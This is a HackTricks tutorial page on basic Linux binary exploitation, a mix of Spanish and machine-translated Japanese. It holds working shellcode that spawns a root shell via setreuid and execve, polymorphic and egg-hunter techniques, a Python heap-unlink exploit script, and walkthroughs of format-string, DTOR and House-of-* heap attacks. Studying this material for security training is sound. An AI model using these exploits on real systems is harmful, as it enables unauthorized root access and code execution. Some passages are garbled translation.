# Linux Exploiting (Basic) (SPA)

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したり、HackTricks をPDFでダウンロードしたり**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)で**フォロー**する
* **ハッキングトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出する**

</details>

## **2.SHELLCODE**

Ver interrupciones de kernel: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep “\_\_NR\_”

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(“/bin/sh”, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; limpiamos eax\
xor ebx, ebx ; ebx = 0 pues no hay argumento que pasar\
mov al, 0x01 ; eax = 1 —> \_\_NR\_exit 1\
int 0x80 ; Ejecutar syscall

**nasm -f elf assembly.asm** —> Nos devuelve un .o\
**ld assembly.o -o shellcodeout** —> Nos da un ejecutable formado por el código ensamblador y podemos sacar los opcodes con **objdump**\
**objdump -d -Mintel ./shellcodeout** —> Para ver que efectivamente es nuestra shellcode y sacar los OpCodes

**Comprobar que la shellcode funciona**
```
char shellcode[] = “\x31\xc0\x31\xdb\xb0\x01\xcd\x80”

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
システムコールが正しく行われているかを確認するには、前述のプログラムをコンパイルし、システムコールが**strace ./PROGRAMA\_COMPILADO**に表示される必要があります。

シェルコードを作成する際には、トリックを使用することができます。最初の命令はcallにジャンプするものです。callは元のコードを呼び出し、さらにEIPをスタックに入れます。call命令の後に必要な文字列を入れており、そのEIPを使用して文字列を指し示し、さらにコードを実行できます。

例 **TRUCO (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al último call
popl                %esi                                       ; Guardamos en ese la dirección al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=“/bin/sh”
leal                 0x8(%esi), %ecx      ; arg[2] = {“/bin/sh”, “0”}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(“/bin/sh”, [“/bin/sh”, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instrución
.string             \”/bin/sh\”                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
**Stackを使用したEJ(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; “\0”
push               dword 0x68732f2f ; “//sh”
push               dword 0x6e69622f; “/bin”
mov                ebx, esp                     ; arg1 = “/bin//sh\0”
push               eax                             ; Null -> args[1]
push               ebx                             ; “/bin/sh\0” -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(“/bin/sh”, args[“/bin/sh”, “NULL”], NULL)
```
**EJ FNSTENV:**  
EJ FNSTENV 命令は、スタックに現在の FPU 状態を保存します。
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutó fabs
…
```
**Egg Hunter:**

プロセスに関連付けられたメモリページをスキャンし、そこに保存されているシェルコードを探す小さなコードです（シェルコードに配置されたいくつかの署名を探します）。コードをインジェクトするための小さなスペースしか利用できない場合に便利です。

**Polymorphic Shellcodes**

これは、暗号化されたシェルで、それを復号化してジャンプする小さなコードを持っており、Call-Popトリックを使用しています。これは**シーザー暗号の暗号化例**です：
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerá)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aquí va el shellcode
```
## **5.補足手法**

**Ret2Ret**

EIPにスタックのアドレスを入れることができない場合（EIPが0xbfを含まないことが確認されている）や、shellcodeの場所を計算できない場合に便利です。ただし、脆弱な関数がパラメーターを受け入れる場合（ここにshellcodeが配置されます）。

したがって、EIPを**ret**のアドレスに変更すると、次のアドレス（関数の最初の引数のアドレス）がロードされます。つまり、shellcodeがロードされます。

Exploitは次のようになります：SHELLCODE + パディング（EIPまで） + **\&ret**（スタックに渡されたアドレスがshellcodeの開始を指すため、次のバイトはretになります）

**strncpy**のような関数は、完了後にshellcodeが保存されていたアドレスをスタックから削除するため、このテクニックを不可能にします。つまり、関数に渡されるアドレス（shellcodeを保存するアドレス）は0x00で置き換えられるため、2番目の**ret**を呼び出すと0x00が見つかり、プログラムが停止します。



**Muratのテクニック**

Linuxでは、すべてのプログラムが0xbfffffffからマップされます。

Linuxの新しいプロセスのスタックがどのように構築されるかを見ると、プログラムがshellcodeのみの環境で起動されるようにエクスプロイトを開発できます。そのアドレスは次のように計算できます：addr = 0xbfffffff - 4 - strlen(NOMBRE\_ejecutable\_completo) - strlen(shellcode)

これにより、shellcodeを含む環境変数のアドレスを簡単に取得できます。

これは、execle関数が望ましい環境変数のみを持つ環境を作成できるために可能です。

**整数オーバーフロー**

この種のオーバーフローは、変数が渡される数値をサポートする準備ができていない場合に発生します。符号付きと符号なしの変数の混乱による可能性があります。
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
前の例では、プログラムが2つのパラメータを期待していることがわかります。最初は次の文字列の長さで、2番目は文字列です。

最初のパラメータとして負の数を渡すと、「len < 256」と表示され、そのフィルターを通過します。さらに、strlen(buffer) も l より小さくなります。なぜなら、l は unsigned int で非常に大きいからです。

この種のオーバーフローは、プログラムのプロセスに何かを書き込むことを目指すのではなく、他の脆弱性を悪用するために設計されたフィルターを回避することを目的としています。

**初期化されていない変数**

初期化されていない変数が取る値はわからず、それを観察することが興味深いかもしれません。前の関数の変数が取っていた値を取る可能性があり、その変数が攻撃者によって制御される可能性があります。

##

###

###

###

### **.fini\_array**

基本的には、プログラムが終了する前に呼び出される**関数が含まれる構造**です。これは、**アドレスにジャンプして shellcode を呼び出す**ことができる場合や、フォーマット文字列を**2回目に悪用するために再び main に戻る**必要がある場合に興味深いです。
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
注意：これは**無限ループを作成しません**。なぜなら、mainに戻るとキャナリが気づき、スタックの末尾が破損している可能性があり、関数が再度呼び出されなくなるからです。したがって、これにより、脆弱性の**1回の実行を追加**できます。

### **コンテンツをダンプするためのフォーマット文字列**

フォーマット文字列は、プログラムのメモリから**コンテンツをダンプ**するためにも悪用されることがあります。\
たとえば、次の状況では、**フラグを指すスタック内のローカル変数**があります。**メモリ**のどこに**フラグへのポインタ**があるかを**見つける**と、**printfがそのアドレスにアクセス**して**フラグを表示**できます。

したがって、フラグは**0xffffcf4c**にあります

![](<../../.gitbook/assets/image (618) (2).png>)

そして、リークから**フラグへのポインタ**が**8番目の**パラメータにあることがわかります：

![](<../../.gitbook/assets/image (623).png>)

したがって、**8番目のパラメータ**にアクセスすると、フラグを取得できます：

![](<../../.gitbook/assets/image (624).png>)

**前のエクスプロイト**に続いて**コンテンツをリーク**し、**`printf`**への**ポインタ**を**実行可能なセクション**に**設定**して、それを**完全にダンプ**できます！

### **DTOR**

{% hint style="danger" %}
現在、**dtorセクションを持つバイナリを見つけるのは非常に珍しい**です。
{% endhint %}

デストラクタは、プログラムが終了する前に**実行される関数**です。\
**`__DTOR_END__`**に**シェルコードのアドレス**を**書き込む**ことができれば、それはプログラムが終了する前に**実行**されます。\
このセクションのアドレスを取得するには：
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep “__DTOR”
```
通常、**DTOR**セクションは値`ffffffff`と`00000000`の間にあります。したがって、これらの値だけを見ると、**登録された関数がない**ことを意味します。したがって、**`00000000`**を**シェルコードのアドレス**で**上書き**して、それを実行します。

### **バッファオーバーフローへのフォーマット文字列**

**sprintf**はフォーマットされた文字列を**変数に移動**します。したがって、文字列の**フォーマット**を悪用して、コピーされる変数で**バッファオーバーフロー**を引き起こすことができます。\
例えば、ペイロード`%.44xAAAA`は、変数に44B+"AAAA"を**書き込む**ため、バッファオーバーフローを引き起こす可能性があります。

### **\_\_atexit構造体**

{% hint style="danger" %}
現在、これを**悪用するのは非常に珍しい**です。
{% endhint %}

**`atexit()`**は、**他の関数がパラメーターとして渡される**関数です。これらの**関数**は、**`exit()`の実行**または**mainの戻り**時に**実行**されます。\
たとえば、これらの**関数**の**アドレス**をシェルコードを指すように**変更**できれば、**プロセスを制御**できますが、現在はより複雑です。\
現在、**実行される関数のアドレス**は、いくつかの構造体の背後に隠されており、最終的にそれが指すアドレスは関数のアドレスではなく、**XOR**とランダムなキーで**暗号化**されています。したがって、現在、この攻撃ベクトルは**x86**および**x64\_86**では**あまり有用ではありません**。\
**暗号化関数**は**`PTR_MANGLE`**です。 m68k、mips32、mips64、aarch64、arm、hppaなどの**他のアーキテクチャ**は、**同じものを返す**ため、暗号化関数を実装していません。したがって、これらのアーキテクチャはこのベクトルによって攻撃される可能性があります。

### **setjmp() & longjmp()**

{% hint style="danger" %}
現在、これを**悪用するのは非常に珍しい**です。
{% endhint %}

**`Setjmp()`**は、**コンテキスト**（レジスタ）を**保存**することを可能にします。\
**`longjmp()`**は、**コンテキスト**を**復元**することを可能にします。\
保存されるレジスタは、`EBX、ESI、EDI、ESP、EIP、EBP`です。\
問題は、EIPとESPが**`PTR_MANGLE`**関数によって渡されることで、**この攻撃に対して脆弱なアーキテクチャは上記と同じ**です。\
エラー回復や割り込みに役立ちます。\
ただし、他のレジスタは保護されていないという情報もあります。したがって、関数内で`call ebx`、`call esi`、`call edi`がある場合、制御を取得できます。または、ESPを変更してEBPを変更することもできます。

**VTableとVPTR in C++**

各クラスには、メソッドへの**ポインタの配列**である**Vtable**があります。

各**クラス**のオブジェクトには、そのクラスの配列への**ポインタ**である**VPtr**があります。 VPtrは各オブジェクトのヘッダーの一部です。したがって、VPtrを**上書き**すると、実行される関数がシェルコードに移動する可能性があります。

## **予防措置と回避策**

###

**Libsafeの置換**

次で有効になります：LD\_PRELOAD=/lib/libsafe.so.2\
または\
“/lib/libsave.so.2” > /etc/ld.so.preload

いくつかの危険な関数呼び出しを安全な関数呼び出しに置き換えます。標準化されていません（x86専用、-fomit-frame-pointerでのコンパイル、静的コンパイルでは機能しません、すべての脆弱な関数が安全になるわけではなく、LD\_PRELOADはsetuidバイナリでは機能しません）。

**ASCIIアーマードアドレススペース**

共有ライブラリを0x00000000から0x00ffffffにロードして、常に0x00のバイトがあるようにします。ただし、これはほとんどすべての攻撃を防ぐことはできず、リトルエンディアンではなおさらです。

**ret2plt**

strcpy@plt関数（pltから）を呼び出し、GOTのエントリを指し、呼び出したい関数（system()）の最初のバイトをコピーするROPを実行することで構成されます。その後、GOT+1を指すように同じことを繰り返し、system()の2番目のバイトをコピーします。最後に、system()になるGOTに保存されたアドレスを呼び出します。

**chroot()でのジェイル**

debootstrap -arch=i386 hardy /home/user —> 特定のサブディレクトリに基本システムをインストールします

管理者は、これらのジェイルから抜け出すことができます：mkdir foo; chroot foo; cd ..

**コードインストゥルメンテーション**

Valgrind —> エラーを検索します\
Memcheck\
RAD（Return Address Defender）\
Insure++
**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I”, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo está libre esté a 1**

**fake\_size = pack("\<I”, 0xfffffffc) #-4, para que piense que el “size” del 3º trozo está 4bytes detrás (apunta a prev\_size) pues es ahí donde mira si el 2º trozo está libre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #En el payload al principio le vamos a poner 8bytes de relleno**

**got\_free = pack("\<I", 0x08048300 - 12) #Dirección de free() en la plt-12 (será la dirección que se sobrescrita para que se lanza la shellcode la 2º vez que se llame a free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como se dijo el payload comienza con 8 bytes de relleno porque sí**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Se modifica el 2º trozo, el got\_free apunta a donde vamos a guardar la direccion addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando en sentido inverso (wargame)**

Estamos controlando 3 chunks consecutivos y se liberan en orden inverso al reservado.

En ese caso:

En el chunck c se pone el shellcode

El chunck a lo usamos para sobreescribir el b de forma que el el size tenga el bit PREV\_INUSE desactivado de forma que piense que el chunck a está libre.

Además, se sobreescribe en la cabecera b el size para que valga -4.

Entonces, el programa se pensará que “a” está libre y en un bin, por lo que llamará a unlink() para desenlazarlo. Sin embargo, como la cabecera PREV\_SIZE vale -4. Se pensará que el trozo de “a” realmente empieza en b+4. Es decir, hará un unlink() a un trozo que comienza en b+4, por lo que en b+12 estará el puntero “fd” y en b+16 estará el puntero “bk”.

De esta forma, si en bk ponemos la dirección a la shellcode y en fd ponemos la dirección a la función “puts()”-12 tenemos nuestro payload.

**Técnica de Frontlink**

Se llama a frontlink cuando se libera algo y ninguno de sus trozos contiguos no son libres, no se llama a unlink() sino que se llama directamente a frontlink().

Vulnerabilidad útil cuando el malloc que se ataca nunca es liberado (free()).

Necesita:

Un buffer que pueda desbordarse con la función de entrada de datos

Un buffer contiguo a este que debe ser liberado y al que se le modificará el campo fd de su cabecera gracias al desbordamiento del buffer anterior

Un buffer a liberar con un tamaño mayor a 512 pero menor que el buffer anterior

Un buffer declarado antes del paso 3 que permita sobreescribir el prev\_size de este

De esta forma logrando sobres cribar en dos mallocs de forma descontrolada y en uno de forma controlada pero que solo se libera ese uno, podemos hacer un exploit.

**Vulnerabilidad double free()**

Si se llama dos veces a free() con el mismo puntero, quedan dos bins apuntando a la misma dirección.

En caso de querer volver a usar uno se asignaría sin problemas. En caso de querer usar otro, se le asignaría el mismo espacio por lo que tendríamos los punteros “fd” y “bk” falseados con los datos que escribirá la reserva anterior.

**After free()**

Un puntero previamente liberado es usado de nuevo sin control.

## **8 Heap Overflows: Exploits avanzados**

Las técnicas de Unlink() y FrontLink() fueron eliminadas al modificar la función unlink().

**The house of mind**

Solo una llamada a free() es necesaria para provocar la ejecución de código arbitrario. Interesa buscar un segundo trozo que puede ser desbordado por uno anterior y liberado.

Una llamada a free() provoca llamar a public\_fREe(mem), este hace:

mstate ar\_ptr;

mchunkptr p;

…

p = mem2chunk(mes); —> Devuelve un puntero a la dirección donde comienza el trozo (mem-8)

…

ar\_ptr = arena\_for\_chunk(p); —> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

…

\_int\_free(ar\_ptr, mem);

}

En \[1] comprueba el campo size el bit NON\_MAIN\_ARENA, el cual se puede alterar para que la comprobación devuelva true y ejecute heap\_for\_ptr() que hace un and a “mem” dejando a 0 los 2.5 bytes menos importantes (en nuestro caso de 0x0804a000 deja 0x08000000) y accede a 0x08000000->ar\_ptr (como si fuese un struct heap\_info)

De esta forma si podemos controlar un trozo por ejemplo en 0x0804a000 y se va a liberar un trozo en **0x081002a0** podemos llegar a la dirección 0x08100000 y escribir lo que queramos, por ejemplo **0x0804a000**. Cuando este segundo trozo se libere se encontrará que heap\_for\_ptr(ptr)->ar\_ptr devuelve lo que hemos escrito en 0x08100000 (pues se aplica a 0x081002a0 el and que vimos antes y de ahí se saca el valor de los 4 primeros bytes, el ar\_ptr)

De esta forma se llama a \_int\_free(ar\_ptr, mem), es decir, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
…\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Como hemos visto antes podemos controlar el valor de av, pues es lo que escribimos en el trozo que se va a liberar.

Tal y como se define unsorted\_chunks, sabemos que:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Por lo tanto si en av->bins\[2] escribimos el valor de \_\_DTOR\_END\_\_-12 en la última instrucción se escribirá en \_\_DTOR\_END\_\_ la dirección del segundo trozo.

Es decir, en el primer trozo tenemos que poner al inicio muchas veces la dirección de \_\_DTOR\_END\_\_-12 porque de ahí la sacará av->bins\[2]

En la dirección que caiga la dirección del segundo trozo con los últimos 5 ceros hay que escribir la dirección a este primer trozo para que heap\_for\_ptr() piense que el ar\_ptr está al inicio del primer trozo y saque de ahí el av->bins\[2]

En el segundo trozo y gracias al primero sobreescribimos el prev\_size con un jump 0x0c y el size con algo para activar -> NON\_MAIN\_ARENA

A continuación en el trozo 2 ponemos un montón de nops y finalmente la shellcode

De esta forma se llamará a \_int\_free(TROZO1, TROZO2) y seguirá las instrucciones para escribir en \_\_DTOR\_END\_\_ la dirección del prev\_size del TROZO2 el cual saltará a la shellcode.
このテクニックを適用するには、ペイロードを少し複雑にするいくつかの要件を満たす必要があります。

このテクニックはもはや適用されません。unlinkに適用されたパッチとほぼ同じパッチが適用されました。新しいサイトが自身を指しているかどうかを比較します。

**Fastbin**

The house of mindのバリエーションです。

次のコードを実行することに興味があります。これは、\_int\_free()関数の最初のチェックを通過した後に到達します。

fb = &(av->fastbins\[fastbin\_index(size)] —> fastbin\_index(sz) —> (sz >> 3) - 2

…

p->fd = \*fb

\*fb = p

したがって、"fb"に関数のアドレスが入ると、そのアドレスに上書きされる。これには、アリーナがdtorsのアドレスに近い必要があります。具体的には、av->max\_fastが上書きされるアドレスにある必要があります。

The House of Mindでavの位置を制御できることがわかったので、sizeフィールドに8 + NON\_MAIN\_ARENA + PREV\_INUSEを設定すると、fastbin\_index()はfastbins\[-1\]を返し、これはav->max\_fastを指します。

av->max\_fastが上書きされるアドレスである必要があります（ポインタが指すのではなく、その位置が上書きされます）。

さらに、解放された隣接するチャンクのサイズが8より大きい必要があります。解放されたチャンクのサイズが8であると述べたので、この偽のチャンクには8より大きいサイズを設定する必要があります（さらに、シェルコードは解放されたチャンクに配置されるため、最初にnopsに落ちるjmpを配置する必要があります）。

さらに、同じ偽のチャンクはav->system\_memより小さくなければなりません。av->system\_memは1848バイト先にあります。

\_DTOR\_END\_のヌルとGOTのアドレスが少ないため、これらのセクションのどのアドレスも上書きに適していません。そのため、スタックを攻撃するためにfastbinを適用する方法を見てみましょう。

攻撃の別の方法は、**av**をスタックにリダイレクトすることです。

サイズを8ではなく16に変更すると、fastbin\_index()はfastbins\[0\]を返し、これを使用してスタックを上書きできます。

これには、スタックにcanaryや奇妙な値が含まれていない必要があります。実際、このような構造が必要です：4バイトのヌル + EBP + RET

4バイトのヌルが必要です。なぜなら、**av**がこのアドレスにある必要があり、**av**の最初の要素は0でなければならないmutexです。

**av->max\_fast**はEBPになり、制約をスキップするための値になります。

**av->fastbins\[0\]**には**p**のアドレスが上書きされ、RETになり、これによりシェルコードにジャンプします。

さらに、**av->system\_mem**（スタック上の位置から1484バイト上にある）には、スキップされる可能性のあるゴミがたくさんあり、これにより実行されるチェックがスキップされます。

解放された隣接するチャンクのサイズが8より大きい必要があります。解放されたチャンクのサイズが16であると述べたので、この偽のチャンクには8より大きいサイズを設定する必要があります（さらに、シェルコードは解放されたチャンクに配置されるため、新しい偽のチャンクのサイズフィールドの後に配置されるnopsにジャンプするjmpを最初に配置する必要があります）。

**The House of Spirit**

この場合、攻撃者が変更できるmallocへのポインタ（たとえば、オーバーフロー可能な変数の下のスタックにあるポインタ）を持つことを目指します。

したがって、このポインタを任意の場所に指すようにすることができます。ただし、どの場所でも有効ではありません。偽のチャンクのサイズはav->max\_fastより小さく、より具体的には将来のmalloc()呼び出しで要求されるサイズ+8と同じでなければなりません。したがって、この脆弱なポインタの後にmalloc(40)が呼び出されることがわかっている場合、偽のチャンクのサイズは48と同じでなければなりません。

たとえば、プログラムがユーザーに数値を尋ねる場合、48を入力し、mallocが制御可能な次の4バイトを指すようにポインタを変更できます（これらは幸運な場合、EBPに属する可能性があります。したがって、48は後ろに残り、サイズのヘッダーのように見えます）。さらに、ptr-4+48のアドレスにはいくつかの条件を満たす必要があります（この場合、ptr=EBPである）つまり、8 < ptr-4+48 < av->system\_mem。

これが満たされると、次にmallocが呼び出されると、EBPのアドレスが割り当てられます。攻撃者がこのmallocに書き込むこともできる場合、EBPとEIPの両方を任意のアドレスで上書きできます。

これは、free()がスタックのEBPを指すアドレスに、新しいmalloc()で予約する完璧なサイズのチャンクがあることを覚えているためだと思われます。そのため、そのアドレスが割り当てられます。

**The House of Force**

必要なもの：

* wildernessを上書きできるチャンクへのオーバーフロー
* ユーザーが定義したサイズでmalloc()を呼び出す
* ユーザーが定義したデータでmalloc()を呼び出す

最初に行うことは、wildernessチャンクのサイズを非常に大きな値（0xffffffff）で上書きすることです。したがって、十分に大きなメモリ要求は、ヒープを拡張する必要なしに_int_malloc()で処理されます。

次に、av->topを、スタックなどの攻撃者の制御下にあるメモリ領域を指すように変更します。av->topには\&EIP - 8が入ります。

av->topを攻撃者の制御下のメモリ領域を指すように上書きする必要があります：

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victimは現在のwildernessチャンクのアドレスを収集し、remainderはそのアドレスにmalloc()によって要求されたバイト数を追加したものです。したがって、\&EIP-8が0xbffff224を指し、av->topが0x080c2788を含む場合、av->topを次のmalloc()で\&EIP-8を指すようにするには、制御されたmallocに予約する必要があるバイト数は次のようになります：

0xbffff224 - 0x080c2788 = 3086207644.

これにより、av->topに変更された値が保存され、次のmallocがEIPを指し、上書きできるようになります。

新しいwildernessチャンクのサイズが、最後のmalloc()によって要求されたサイズよりも大きい必要があります。つまり、wildernessが\&EIP-8を指している場合、サイズはちょうどスタックのEBPフィールドになります。

**The House of Lore**

**SmallBinの破損**

解放されたチャンクは、サイズに応じてbinに挿入されます。しかし、挿入される前に、それらはunsorted binsに保存されます。チャンクが解放されると、すぐにそのbinに挿入されるのではなく、unsorted binsに残ります。次に、新しいチャンクが予約され、前の解放されたチャンクが役立つ場合はそれが返されますが、より大きなチャンクが予約されると、unsorted binsにある解放されたチャンクが適切なbinに挿入されます。

脆弱なコードに到達するには、メモリ要求がav->max\_fast（通常72）より大きく、MIN\_LARGE\_SIZE（512）より小さい必要があります。

binに適切なサイズのチャンクがある場合、それを解除してから返します：

bck = victim->bk; 前のチャンクを指します。これを変更できる唯一の情報です。

bin->bk = bck; 2番目のチャンクが最後のチャンクになります。bckがスタックを指している場合、次に予約されるチャンクにこのアドレスが与えられます。

bck->fd = bin; リストを閉じ、これをbinに指すようにします。

必要なもの：
## **ヒープ攻撃の基本**

1. 2つのmallocを予約し、2番目のmallocが解放され、そのbinに入れられた後に最初のmallocにオーバーフローを行うことができるようにします（つまり、オーバーフローを行う前に2番目のチャンクよりも大きなmallocが予約されます）。

2. 攻撃者が選択したアドレスを持つmallocが攻撃者によって制御されるようにします。

3. 攻撃の目的は、解放されたbin内に下にあるヒープにオーバーフローを行うことができれば、そのbinのbkポインタを変更できるようにすることです。bkポインタを変更し、そのチャンクがbinのリストの最初になり、予約されると、binは次に提供されるリストの最後のチャンクが攻撃者が設定した偽のアドレス（たとえばスタックまたはGOT）にあると信じ込まされます。したがって、別のチャンクが再度予約され、攻撃者がそのチャンクにアクセス権を持っている場合、望ましい位置にチャンクが与えられ、その位置に書き込むことができます。

4. 変更されたチャンクを解放した後、解放されたチャンクよりも大きなチャンクを予約する必要があります。これにより、変更されたチャンクはunsorted binsから出て、そのbinに入れられます。

5. binに入った後は、オーバーフローを使用してbkポインタを変更し、binがmalloc()が十分に呼び出されるのを待つ必要があります。これにより、変更されたbinが再度使用され、binを騙して次のチャンクが偽のアドレスにあると信じ込ませることができます。そして、望ましいチャンクが与えられます。

6. この脆弱性ができるだけ早く発生するようにするには、脆弱なチャンクを予約し、変更されるチャンクを予約し、そのチャンクを解放し、変更されるチャンクよりも大きなチャンクを予約し、チャンク（脆弱性）を変更し、脆弱なチャンクと同じサイズのチャンクを予約し、2番目の脆弱なチャンクを予約し、これが攻撃者が指定したアドレスを指すようにします。

7. この攻撃を防ぐために、通常の偽のチェックが使用されます：bck->fdがvictimを指していないことを確認します。つまり、スタックに指された偽のチャンクのfdポインタがvictimを指しているかどうかを確認します。この保護をバイパスするには、攻撃者は適切なアドレスにvictimのアドレスを書き込む方法を見つける必要があります。これにより、本物のチャンクのように見せかけることができます。

## **LargeBinの破損**

1. 前述の要件に加えて、予約されたチャンクは512よりも大きくする必要があります。

2. 攻撃は前述のものと同じですが、変更されたチャンクのサイズを変更する必要があります。つまり、そのサイズ - nbがMINSIZEよりも小さくなるようにする必要があります。

3. たとえば、サイズを1552に設定して、1552 - 1544 = 8 < MINSIZEとなるようにします（負にならないようにするため、unsignedで比較されます）。

4. さらに、攻撃をより複雑にするためのパッチが導入されています。

## **ヒープスプレー**

- ヒープスプレーは、ヒープに可能な限り多くのメモリを予約し、これらをnopsのパディングで埋め、最後にシェルコードで終了させることを基本とします。パディングとして0x0cを使用します。つまり、アドレス0x0c0c0c0cにジャンプしようとします。したがって、このパディングで呼び出されるアドレスが上書きされる場合、そこにジャンプします。基本的には、可能な限り多くを予約してポインタが上書きされるかどうかを確認し、0x0c0c0c0cにジャンプし、そこにnopsがあることを期待する戦術です。

## **ヒープ風水**

- ヒープ風水は、予約と解放を繰り返すことで、空きチャンクの間に予約されたチャンクが残るようにメモリを配置することです。オーバーフローするバッファは、これらの空きチャンクの1つに配置されます。
